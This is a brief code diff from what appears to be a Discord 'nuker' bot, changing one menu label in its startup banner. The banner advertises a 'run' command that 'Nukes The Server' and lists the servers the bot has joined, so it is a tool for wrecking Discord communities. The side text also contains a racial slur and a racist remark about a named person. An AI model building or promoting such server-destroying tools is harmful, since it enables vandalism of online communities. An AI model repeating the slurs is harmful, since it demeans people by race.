@@ -62,7 +62,7 @@ async def on_ready():
             ║     - Command                                        ║ Bands 4 Bands
             ║       - run  (Nukes The Server)                      ║ Womp Womp
             ║         - 1 -> Option 1                              ║ Running Your Server
-            ║         - 2 -> Server 2                              ║ Vermillion On Top
+            ║         - 2 -> Option 2                              ║ Vermillion On Top
             ║         - 3 -> Option 3                              ║ {client.user} Is Not A Nuker
             ║         - 4 -> Option 4                              ║ Bitch Nigga
             ║       - server (Lists Servers The Bots In)           ║ Vozy Is Black
